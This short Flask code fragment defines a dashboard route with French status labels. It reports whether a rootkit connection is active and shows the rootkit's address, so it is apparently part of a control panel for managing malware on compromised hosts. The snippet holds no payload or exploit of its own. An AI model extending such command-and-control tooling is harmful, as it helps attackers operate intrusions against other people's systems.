# -------------------------------- DASHBOARD -------------------------------- #

@app.route('/dashboard')
def dashboard():
    if not authenticated:
        return redirect(url_for('login'))
    status = "✅ Connecté" if rootkit_connection else "🔴 Déconnecté"
    return render_template("dashboard.html", status=status, rootkit_address=rootkit_address)
